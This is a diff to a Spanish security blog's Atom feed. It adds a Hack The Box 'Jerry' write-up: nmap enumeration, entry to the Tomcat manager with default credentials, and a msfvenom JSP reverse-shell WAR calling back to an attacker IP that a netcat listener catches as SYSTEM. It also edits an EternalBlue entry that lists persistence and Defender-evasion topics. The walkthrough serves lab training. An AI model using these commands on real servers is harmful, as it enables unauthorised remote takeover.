@@ -1,4 +1,163 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-20T01:36:32-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ewor01 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs, investigaciones, herramientas, charlas, etc.</subtitle><author><name>ewor01</name></author><entry><title type="html">Ingeniería social y cómo protegerse</title><link href="http://localhost:4000/ingenier%C3%ADa-social/" rel="alternate" type="text/html" title="Ingeniería social y cómo protegerse" /><published>2023-01-16T00:00:00-06:00</published><updated>2023-01-16T00:00:00-06:00</updated><id>http://localhost:4000/ingenier%C3%ADa-social</id><content type="html" xml:base="http://localhost:4000/ingenier%C3%ADa-social/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-01-29T22:42:32-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">ewor01 | Ciberseguridad y Hacking Ético</title><subtitle>Artículos sobre ciberseguridad, CTFs, investigaciones, herramientas, charlas, etc.</subtitle><author><name>ewor01</name></author><entry><title type="html">Jerry - Hack The Box</title><link href="http://localhost:4000/jerry-hackthebox/" rel="alternate" type="text/html" title="Jerry - Hack The Box" /><published>2023-01-29T00:00:00-06:00</published><updated>2023-01-29T00:00:00-06:00</updated><id>http://localhost:4000/jerry-hackthebox</id><content type="html" xml:base="http://localhost:4000/jerry-hackthebox/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Jerry.png&quot; alt=&quot;Jerry.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Certificaciones a aplicar: eJPT&lt;/p&gt;
+
+&lt;p&gt;Dificultad: Fácil&lt;/p&gt;
+
+&lt;p&gt;Habilidades:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Information Leakage&lt;/li&gt;
+  &lt;li&gt;Abusing Tomcat [Intrusion &amp;amp; Privilege Escalation]&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;ip-de-la-maquina&quot;&gt;IP de la Maquina&lt;/h1&gt;
+
+&lt;p&gt;10.10.10.95&lt;/p&gt;
+
+&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;
+
+&lt;p&gt;Identificando el sistema operativo.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whichSystem.py 10.10.10.95
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-37-24.png&quot; alt=&quot;Hackforce-2022-12-18-18-37-24.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.95 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-48-57.png&quot; alt=&quot;Hackforce-2022-12-18-18-48-57.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Función extractPorts.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extractPorts allPorts
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-49-49.png&quot; alt=&quot;Hackforce-2022-12-18-18-49-49.png&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;análisis-de-vulnerabilidades&quot;&gt;Análisis de Vulnerabilidades&lt;/h1&gt;
+
+&lt;p&gt;Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.95 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-00-49.png&quot; alt=&quot;Hackforce-2022-12-18-19-00-49.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que estamos ante un apache tomcat y nos muestra la version.&lt;/p&gt;
+
+&lt;p&gt;Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-11-18-07-31.png&quot; alt=&quot;Hackforce-2022-12-11-18-07-31.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;De esta manera vemos que estamos ante un Ubuntu Bionic.&lt;/p&gt;
+
+&lt;p&gt;Vamos a verificar con whatweb  y a ver que nos reporta la herramienta.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.95:8080
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-03-36.png&quot; alt=&quot;Hackforce-2022-12-18-19-03-36.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos poco solo que estamos ante un Tomcat de version 7.0.88.&lt;/p&gt;
+
+&lt;p&gt;con whatweb y el parámetro -v nos mostrara un poco mas de información y de manera mas ordenada.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.95:8080 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-14-20.png&quot; alt=&quot;Hackforce-2022-12-18-19-14-20.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Igual no logramos ver nada en concreto a si que vamos a proceder a inspeccionar la web.&lt;/p&gt;
+
+&lt;p&gt;Vemos que es un panel de tomcat.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-40-55.png&quot; alt=&quot;Hackforce-2022-12-18-19-40-55.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vamos a probar una ruta que suele venir siempre cuando hay un tomcat.&lt;/p&gt;
+
+&lt;p&gt;10.10.10.95:8080/manager/html.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-43-27.png&quot; alt=&quot;Hackforce-2022-12-18-19-43-27.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que nos solicita credenciales para acceder.&lt;/p&gt;
+
+&lt;p&gt;Como no disponemos de credenciales, lo habitual es probar las que vienen por default en la aplicación.&lt;/p&gt;
+
+&lt;p&gt;Si ingresamos las credenciales que vienen por default nos mostrara lo siguiente.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-47-53.png&quot; alt=&quot;Hackforce-2022-12-18-19-47-53.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si leemos detenidamente lo que nos dice, veremos que pone como se deberia configurar las credenciales de acceso y vemos 2 campos interesantes, username y password.&lt;/p&gt;
+
+&lt;p&gt;Colocamos las credenciales que encontramos al ver el archivo anterior y probamos.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-51-20.png&quot; alt=&quot;Hackforce-2022-12-18-19-51-20.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como vemos hemos podido ingresar, ahora observaremos detenidamente que podemos hacer.&lt;/p&gt;
+
+&lt;p&gt;Vemos que podemos subir nuestro propio archivo war.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-53-30.png&quot; alt=&quot;Hackforce-2022-12-18-19-53-30.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Lo que trataremos de hacer sera subir un war malicioso para que lo podamos ejecutar desde el panel de aplicaciones.&lt;/p&gt;
+
+&lt;h1 id=&quot;explotación&quot;&gt;Explotación&lt;/h1&gt;
+
+&lt;p&gt;Vamos a generar un war malicioso con msfvenom.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; payloads | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;java
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-04-18.png&quot; alt=&quot;Hackforce-2022-12-18-20-04-18.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Con este comando listamos los payloads disponibles en java, porque este nos permitirá generar el war malicioso. En este caso el que nos interesa es el que pone java/jsp_shell_reverse_tcp para entablarnos una conexión inversa en la maquina victima.&lt;/p&gt;
+
+&lt;p&gt;Luego nos dirigimos al directorio content y creamos el payload con msfvenom.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; java/jsp_shell_reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;10.10.14.4 &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;443 &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; war &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; shell.war
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-16-25.png&quot; alt=&quot;Hackforce-2022-12-18-20-16-25.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Listo ahi tendríamos nuestro war malicioso creado.&lt;/p&gt;
+
+&lt;p&gt;Ahora nos movemos el war malicioso a nuestro directorio de descargas y lo subimos a tomcat.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-20-37.png&quot; alt=&quot;Hackforce-2022-12-18-20-20-37.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Así se miraría nuestro war malicioso en el servidor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-22-55.png&quot; alt=&quot;Hackforce-2022-12-18-20-22-55.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora nos ponemos en escucha con netcat y ejecutamos el war malicioso.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rlwrap nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-25-47.png&quot; alt=&quot;Hackforce-2022-12-18-20-25-47.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Con esto deberíamos ganar acceso a la maquina y estaríamos como nt authority system.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-29-47.png&quot; alt=&quot;Hackforce-2022-12-18-20-29-47.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Procedemos a buscar las flags y listo con esto terminaríamos la maquina.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-41-30.png&quot; alt=&quot;Hackforce-2022-12-18-20-41-30.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahi podemos visualizar las flags, que como vemos nos dan la de user y root.&lt;/p&gt;
+
+&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios&lt;/h1&gt;
+
+&lt;p&gt;En este caso la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa por lo que no hay que elevar privilegios.&lt;/p&gt;
+
+&lt;p&gt;Listo con esto tendríamos hecha la maquina por completo, happy hacking.&lt;/p&gt;
+
+&lt;p&gt;Les dejo la resolución de la misma por s4vitar &lt;a href=&quot;https://www.youtube.com/watch?v=bB-M5vPegMk&quot;&gt;Ver video&lt;/a&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="Information Leakage" /><category term="Tomcat" /><summary type="html">Jerry es una maquina donde estaremos explotando una vulnerabilidad en Tomcat, en el cual comprometeremos la maquina mediante un archivo war malicioso.</summary></entry><entry><title type="html">Ingeniería social y cómo protegerse</title><link href="http://localhost:4000/ingenier%C3%ADa-social/" rel="alternate" type="text/html" title="Ingeniería social y cómo protegerse" /><published>2023-01-16T00:00:00-06:00</published><updated>2023-01-16T00:00:00-06:00</updated><id>http://localhost:4000/ingenier%C3%ADa-social</id><content type="html" xml:base="http://localhost:4000/ingenier%C3%ADa-social/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/ingeniería-social/ingeniería-social2.jpg&quot; /&gt;
 &lt;/p&gt;
 
@@ -266,9 +425,6 @@ Creo que este es uno de los puntos más importantes, ya que al menos para mí ho
   &lt;li&gt;Obtaining credentials stored in memory [MIMIKATZ + Windows Defender Evasion] (EXTRA)&lt;/li&gt;
   &lt;li&gt;Enabling RDP from CrackMapExec (EXTRA)&lt;/li&gt;
   &lt;li&gt;Windows Persistence techniques (EXTRA)&lt;/li&gt;
-  &lt;li&gt;Windows Persistence - Playing with debugger [When a user opens a program] (EXTRA)&lt;/li&gt;
-  &lt;li&gt;Windows Persistence - Playing with Gflags [When a user closes a program] (EXTRA)&lt;/li&gt;
-  &lt;li&gt;Windows Persistence - Playing with WMI Events [Executing tasks at regular intervals of time] (EXTRA)&lt;/li&gt;
   &lt;li&gt;Persistence + Windows Defender Evasion [Playing with Ebowla] (EXTRA)&lt;/li&gt;
 &lt;/ul&gt;
 
@@ -561,4 +717,6 @@ payload_type &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; EXE
 
 &lt;p&gt;Hay que tener en cuenta que a veces en entornos empresariales comprometes un equipo no privilegiado pero en la memoria consigues las credenciales de un administrador del dominio, y esto es importante ya que con esto tenemos acceso a todos los equipos de la red.&lt;/p&gt;
 
-&lt;p&gt;Listo con esto tendríamos varias maneras y caminos los cuales nos servirán mucho para otras maquinas, recuerden que la practica hace al maestro&lt;/p&gt;</content><author><name>ewor01</name></author><category term="SMB Enumeration" /><category term="Eternalblue Exploitation(MS17-010)" /><category term="Persistence" /><category term="Windows Defender Evasion" /><summary type="html">Blue es una maquina donde estaremos explotando la famosa vulnerabilidad eternalblue MS17-010, donde miraremos tecnicas de evasion de defender y un par de cosas mas.</summary></entry></feed>
+&lt;p&gt;Listo con esto tendríamos varias maneras y caminos los cuales nos servirán mucho para otras máquinas, recuerden que la practica hace al maestro.&lt;/p&gt;
+
+&lt;p&gt;Les dejo la resolución de la misma por s4vitar &lt;a href=&quot;https://www.youtube.com/watch?v=92XycxcAXkI&quot;&gt;Ver video&lt;/a&gt;&lt;/p&gt;</content><author><name>ewor01</name></author><category term="SMB Enumeration" /><category term="Eternalblue Exploitation(MS17-010)" /><category term="Persistence" /><category term="Windows Defender Evasion" /><summary type="html">Blue es una maquina donde estaremos explotando la famosa vulnerabilidad eternalblue MS17-010 pero manualmente haciendo uso de un exploit en github, luego de comprometer la maquina, practicaremos técnicas de evasión de defender y un par de cosas más.</summary></entry></feed>
